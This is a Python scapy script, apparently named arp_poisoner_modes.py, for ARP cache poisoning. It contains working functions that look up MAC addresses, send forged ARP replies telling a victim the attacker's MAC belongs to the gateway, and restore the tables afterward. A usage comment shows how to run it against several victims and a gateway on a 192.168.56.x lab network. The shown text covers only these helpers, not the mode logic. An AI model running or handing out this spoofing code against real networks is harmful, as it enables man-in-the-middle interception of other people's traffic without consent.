from scapy.all import ARP, Ether, send, srp
import time
import sys

# =============================
# Example usage in Terminal:
#
# Silent mode:
#
# sudo python3 arp_poisoner_modes.py \
#  --victims 192.168.56.101 192.168.56.104 \                    ---if multiple victims
#  --gateway 192.168.56.102 \
#  --iface enp0s3 \
#  --mode silent                                               --- mode can aggressive or custom as well
#
# =====================================


# Get MAC from IP

def get_mac(ip, interface):
    """
    Sends an ARP request and returns the MAC address for a given IP.

    """
    arp_request = ARP(pdst=ip)  # Ask: who has this IP?
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")  # Send to everyone on LAN
    packet = broadcast / arp_request           # Stack layers: Ethernet + ARP

    answered = srp(packet, timeout=2, verbose=False, iface=interface)[0]  # Send and wait for reply
    if answered:
        return answered[0][1].hwsrc  # Return the MAC from the reply
    else:
        print(f"[!] No response for IP {ip}")
        sys.exit(1)

# Send ARP Spoof Packet
def spoof(victim_ip, victim_mac, spoof_ip, interface):
    """
    Sends a spoofed ARP reply to a victim to trick them.

    This makes the victim associate real IP,MAC they want to send to,actually with the attacker's MAC.
    """
    packet = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip)
    send(packet, verbose=False, iface=interface)

# Restore ARP Table
def restore(victim_ip, victim_mac, real_ip, real_mac, interface):
    """
    Sends the correct ARP reply to fix the ARP table after poisoning
    """
    packet = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=real_ip, hwsrc=real_mac)
    send(packet, count=5, verbose=False, iface=interface)  # Send multiple times to ensure update

